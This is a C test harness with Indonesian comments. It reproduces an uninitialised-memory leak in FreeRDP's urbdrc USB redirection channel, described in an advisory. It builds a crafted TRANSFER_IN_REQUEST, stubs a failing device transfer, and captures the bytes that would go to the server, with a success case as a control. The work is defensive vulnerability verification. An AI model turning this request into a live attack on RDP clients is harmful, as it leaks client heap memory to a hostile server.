/*
 * harness_urbdrc.c — bukti dinamis: kebocoran memori tak-terinisialisasi ke server (CWE-457/908).
 *
 * Jalur yang direproduksi (advisory GHSA-hw7p-5h2r-83gq, revisi rentan 993499447e32…):
 *
 *   urbdrc_process_udev_data_transfer(cb, urbdrc, udevman, req)      [pos stream = 4]
 *     └─ baca InterfaceId / MessageId / FunctionId(=TRANSFER_IN_REQUEST 0x105)
 *     └─ udevman->get_udevice_by_UsbDevice()  → IUDEVICE palsu (harness)
 *     └─ urbdrc_process_transfer_request(..., transferDir=IN)
 *          └─ URB_Function = TS_URB_BULK_OR_INTERRUPT_TRANSFER (0x0009)
 *          └─ urb_bulk_or_interrupt_transfer() → pdev->bulk_or_interrupt_transfer(...)   [stub harness]
 *               └─ urb_bulk_transfer_cb() → urb_write_completion()
 *                    └─ Stream_New + Stream_Seek(out, OutputBufferSize)   ← reserve TANPA tulis
 *                    └─ stream_write_and_free()                            ← PDU menuju server
 *
 * Stub `bulk_or_interrupt_transfer` mensimulasikan **transfer IN yang gagal** (device stall):
 * data perangkat tidak pernah ditulis ke stream, sehingga byte yang dikirim adalah sisa heap.
 * `stream_write_and_free` di sini adalah MILIK HARNESS (menangkap byte, bukan mengirim) — jadi
 * tidak boleh menautkan urbdrc_main.o.
 *
 * Dua kasus dijalankan: (1) transfer GAGAL → harus bocor; (2) transfer SUKSES (buffer ditulis)
 * → tidak boleh bocor. Kasus 2 adalah kontrol: membuktikan pengukurannya membedakan, bukan asal hijau.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <winpr/stream.h>
#include <winpr/wlog.h>
#include <freerdp/types.h>
#include <freerdp/channels/log.h>
#include <freerdp/client/channels.h>

#include "urbdrc_main.h"   /* S_IUDEVICE, IUDEVMAN, URBDRC_PLUGIN, t_isoch_transfer_cb */
#include "data_transfer.h" /* urbdrc_process_udev_data_transfer */
#include "urbdrc_types.h"  /* TRANSFER_IN_REQUEST, TS_URB_*, USBD_TRANSFER_DIRECTION_IN */
#include "data_transfer.c" /* titik bocor (fungsi static) dikompilasi ke TU ini */

#define INTERFACE_ID 0x0000BEEF
#define MESSAGE_ID 0x0000002A
#define REQUEST_ID 0x00000001
#define CB_TS_URB 16 /* cukup agar cek panjang internal lolos (butuh >= 4+16) */
#define OUT_BYTES 4096 /* "OutputBufferSize" yang diklaim server */
#define FILL_PATTERN 0x41
#define CAPTURE_MAX (OUT_BYTES + 512)

static BYTE g_capture[CAPTURE_MAX];
static size_t g_captured;
static UINT32 g_out_bytes;
static BOOL g_succeed_transfer; /* FALSE = mensimulasikan transfer gagal */

static IUDEVICE g_idev;
static IUDEVMAN g_udevman;
static GENERIC_CHANNEL_CALLBACK g_cb;
static URBDRC_PLUGIN g_plugin;

/* ---- pengganti stream_write_and_free: yang "dikirim ke server" ditangkap di sini ---- */
UINT stream_write_and_free(IWTSPlugin* plugin, IWTSVirtualChannel* channel, wStream* out)
{
	(void)plugin;
	(void)channel;
	if (out)
	{
		const size_t n = Stream_GetPosition(out);
		if (n > 0 && n <= sizeof(g_capture))
		{
			memcpy(g_capture, Stream_Buffer(out), n);
			g_captured = n;
		}
		Stream_Free(out, TRUE);
	}
	return 0;
}

/* ---- IUDEVICE palsu ---- */
static BOOL fake_is_channel_closed(IUDEVICE* idev)
{
	(void)idev;
	return FALSE;
}

static BOOL fake_detach_kernel_driver(IUDEVICE* idev)
{
	(void)idev;
	return TRUE;
}

static int fake_bulk_or_interrupt_transfer(IUDEVICE* idev, GENERIC_CHANNEL_CALLBACK* callback,
                                           UINT32 MessageId, UINT32 RequestId, UINT32 EndpointAddress,
                                           UINT32 TransferFlags, BOOL NoAck, UINT32 BufferSize,
                                           const BYTE* data, t_isoch_transfer_cb cb, UINT32 Timeout)
{
	(void)idev;
	(void)EndpointAddress;
	(void)TransferFlags;
	(void)data;
	(void)Timeout;

	if (!cb)
		return -1;

	/* stream keluaran yang (pada jalur nyata) diisi backend libusb */
	wStream* out = Stream_New(nullptr, (size_t)BufferSize + 128);
	if (!out)
		return -1;

	if (g_succeed_transfer)
	{
		const size_t want = (size_t)BufferSize <= Stream_Capacity(out) ? BufferSize : Stream_Capacity(out);
		if (want > 0)
			memset(Stream_Buffer(out), FILL_PATTERN, want);
		cb(&g_idev, callback, out, INTERFACE_ID, NoAck, MessageId, RequestId, 0, /*status=*/0, 0, 0,
		   BufferSize);
	}
	else
	{
		/* transfer IN GAGAL (stall / byte < deklarasi): isi stream dibiarkan apa adanya */
		cb(&g_idev, callback, out, INTERFACE_ID, NoAck, MessageId, RequestId, 0,
		   /*status=*/0xC0000001, 0, 0, BufferSize);
	}
	return 0;
}

static IUDEVICE* fake_get_udevice_by_UsbDevice(IUDEVMAN* idevman, UINT32 UsbDevice)
{
	(void)idevman;
	(void)UsbDevice;
	return &g_idev;
}

/* ---- pengukuran ---- */
static double dominant_byte_stats(const BYTE* p, size_t n, BYTE* which)
{
	size_t counts[256] = { 0 };
	size_t i, best = 0;
	BYTE bb = 0;
	for (i = 0; i < n; i++)
		counts[p[i]]++;
	for (i = 0; i < 256; i++)
	{
		if (counts[i] > best)
		{
			best = counts[i];
			bb = (BYTE)i;
		}
	}
	if (which)
		*which = bb;
	return n ? (double)best / (double)n : 0.0;
}

static int run_case(BOOL succeed, int* exit_code)
{
	BYTE bb = 0;
	double ratio = 0.0;
	size_t payload_off = 0;

	g_captured = 0;
	g_succeed_transfer = succeed;
	memset(g_capture, 0, sizeof(g_capture));

	wStream* req = Stream_New(nullptr, 256);
	if (!req)
		return -1;
	Stream_Write_UINT32(req, INTERFACE_ID);
	Stream_Write_UINT32(req, MESSAGE_ID);
	Stream_Write_UINT32(req, TRANSFER_IN_REQUEST);
	Stream_Write_UINT32(req, CB_TS_URB); /* CbTsUrb */
	Stream_Write_UINT16(req, (UINT16)CB_TS_URB); /* Size == CbTsUrb */
	Stream_Write_UINT16(req, TS_URB_BULK_OR_INTERRUPT_TRANSFER);
	Stream_Write_UINT32(req, REQUEST_ID);
	Stream_Write_UINT32(req, 0x00000081); /* PipeHandle → EndpointAddress 0x81 */
	Stream_Write_UINT32(req, USBD_TRANSFER_DIRECTION_IN);
	Stream_Write_UINT32(req, OUT_BYTES);
	Stream_SetPosition(req, 4); /* prasyarat Stream_Rewind_UINT32 di pemanggil */

	(void)urbdrc_process_udev_data_transfer(&g_cb, &g_plugin, &g_udevman, req);

	payload_off = (g_captured > OUT_BYTES) ? (g_captured - OUT_BYTES) : 0;
	ratio = dominant_byte_stats(g_capture + payload_off, g_captured - payload_off, &bb);

	printf("  [%s] total PDU=%zu byte · region OutputBufferSize=%zu byte (offset %zu) · "
	       "byte dominan 0x%02x = %.1f%%\n",
	       succeed ? "transfer SUKSES (kontrol)" : "transfer GAGAL", g_captured, g_captured - payload_off,
	       payload_off, bb, ratio * 100.0);
	fflush(stdout);

	if (!succeed)
	{
		/* bocor = region itu bukan jejak tulisan kita, melainkan pola malloc (MALLOC_PERTURB_) */
		if (ratio >= 0.90 && bb != FILL_PATTERN)
		{
			printf("  LEAK: %zu byte memori tak-terinisialisasi terkirim ke server (dominan 0x%02x)\n",
			       g_captured - payload_off, bb);
			*exit_code = 0;
		}
		else
		{
			printf("  TIDAK terbukti bocor (ratio %.2f, byte 0x%02x)\n", ratio, bb);
			*exit_code = 1;
		}
	}
	else
	{
		if (ratio >= 0.90 && bb == FILL_PATTERN)
		{
			printf("  kontrol OK: region berisi tulisan perangkat (0x%02x), bukan bocoran\n", bb);
			*exit_code = 0;
		}
		else
		{
			printf("  kontrol ANEH: region tidak berisi tulisan kita (0x%02x %.1f%%)\n", bb, ratio * 100.0);
			*exit_code = 1;
		}
	}
	fflush(stdout);
	return 0;
}

int main(void)
{
	int rc_fail = 9, rc_ok = 9;
	WLog_SetLogLevel(WLog_GetRoot(), WLOG_ERROR);

	memset(&g_idev, 0, sizeof(g_idev));
	memset(&g_udevman, 0, sizeof(g_udevman));
	memset(&g_cb, 0, sizeof(g_cb));
	memset(&g_plugin, 0, sizeof(g_plugin));

	g_idev.isChannelClosed = fake_is_channel_closed;
	g_idev.detach_kernel_driver = fake_detach_kernel_driver;
	g_idev.bulk_or_interrupt_transfer = fake_bulk_or_interrupt_transfer;
	g_udevman.get_udevice_by_UsbDevice = fake_get_udevice_by_UsbDevice;
	g_plugin.log = WLog_Get("urbdrc-poc");
	g_cb.plugin = (IWTSPlugin*)&g_plugin;
	g_out_bytes = OUT_BYTES;

	printf("harness urbdrc — kebocoran memori tak-terinisialisasi (CWE-457/908)\n");
	printf("  MALLOC_PERTURB_=%s\n", getenv("MALLOC_PERTURB_") ? getenv("MALLOC_PERTURB_") : "(tak diset)");

	run_case(FALSE, &rc_fail);
	run_case(TRUE, &rc_ok);

	if (rc_fail == 0 && rc_ok == 0)
	{
		printf("VERDICT: TERBUKTI — jalur gagal membocorkan memori, jalur sukses tidak\n");
		return 0;
	}
	printf("VERDICT: BELUM TERBUKTI (gagal=%d kontrol=%d)\n", rc_fail, rc_ok);
	return 1;
}
